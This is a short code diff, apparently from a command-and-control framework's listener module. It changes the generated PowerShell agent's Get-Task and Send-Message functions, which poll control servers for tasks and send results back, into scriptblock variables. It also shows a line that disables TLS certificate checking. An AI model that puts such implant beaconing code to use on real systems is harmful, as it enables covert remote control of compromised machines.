@@ -719,7 +719,7 @@ class Listener:
                     updateServers += "\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
                 getTask = """
-                    function script:Get-Task {
+                    $script:GetTask = {
 
                         try {
                             if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
@@ -759,7 +759,7 @@ class Listener:
                 """
 
                 sendMessage = """
-                    function script:Send-Message {
+                    $script:SendMessage = {
                         param($Packets)
 
                         if($Packets) {
@@ -799,7 +799,7 @@ class Listener:
                         }
                     }
                 """
-
+                
                 return updateServers + getTask + sendMessage
 
             elif language.lower() == 'python':
@@ -856,7 +856,7 @@ def send_message(packets=None):
         return (URLerror.reason, '')
 
     return ('', '')
-"""
+""" 
                 return updateServers + sendMessage
 
             else:
